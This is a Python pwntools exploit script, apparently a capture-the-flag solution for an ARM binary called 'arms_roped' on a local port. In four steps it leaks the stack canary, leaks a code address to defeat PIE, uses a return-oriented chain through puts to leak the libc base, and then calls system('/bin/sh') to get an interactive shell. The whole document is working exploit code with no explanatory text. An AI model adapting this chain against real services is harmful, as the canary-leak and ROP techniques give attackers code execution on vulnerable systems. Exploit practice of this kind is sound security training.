from pwn import *

elf = ELF("arms_roped")
libc = ELF("libc.so.6")
context.arch = "arm"
p = remote("localhost", 1337)

info("Step 1: Canary Leak")
payload = b"A" * 32
payload += b"B"
p.sendline(payload)
canary = p.recvline()
canary = canary[canary.index(b"B") :]
canary = canary[:4]
canary = int.from_bytes(canary, "little")
canary = canary & 0xFFFFFF00
info("Canary leak 0x%x", canary)


info("Step 2: Pie Leak")
payload = b"A" * 44
p.sendline(payload)
main_leak = p.recvline(drop=b"\n")
i = main_leak.index(b"\x48")
raw = main_leak[i : i + 4]
raw = raw.ljust(4, b"\x00")
main_leak = u32(raw)
log.info("main+108: %#x", main_leak)
main_off = elf.sym.main + 108
elf.address = main_leak - main_off
log.info("PIE base: %#x", elf.address)


info("Step 3: LibC Leak")

# pop {r4, r5, r6, r7, r8, sb, sl, pc}
pop_r7 = elf.address + 0x9EC
# pop r3,pc
pop_r3 = elf.address + 0x56C
# mov r0, r7; add r4, r4, #1; blx r3; cmp r6, r4; bne #0x9cc; pop {r4, r5, r6, r7, r8, sb, sl, pc};
mov_r0_r7 = elf.address + 0x9D8


payload = b"quit" + b"A" * 28 + p32(canary) + b"B" * 12
payload += p32(pop_r3) + p32(elf.plt.puts)
payload += p32(pop_r7)
payload += p32(0) * 2 + p32(1) + p32(elf.got.puts) + p32(0) * 3
payload += p32(mov_r0_r7)
payload += p32(0) * 7 + p32(elf.sym.main)

p.sendline(payload)
puts_leak = p.recvline(drop=b"\n")
puts_leak = puts_leak[:4]
puts_leak = u32(puts_leak)
info("PUTS leak 0x%x", puts_leak)
libc.address = puts_leak - (libc.sym.puts)
info("LIBC Base 0x%x", libc.address)


info("Step 4: Shell")

# bin/sh
bin_sh = next(libc.search(b"/bin/sh"))
# pop {r0,r4,pc}
pop_r0 = libc.address + 0x0005BEBC

payload = (
    b"quit"
    + b"A" * 28
    + p32(canary)
    + p32(0) * 3
    + p32(pop_r0)
    + p32(bin_sh)
    + p32(0)
    + p32(libc.sym.system)
)
p.sendline(payload)

p.interactive()
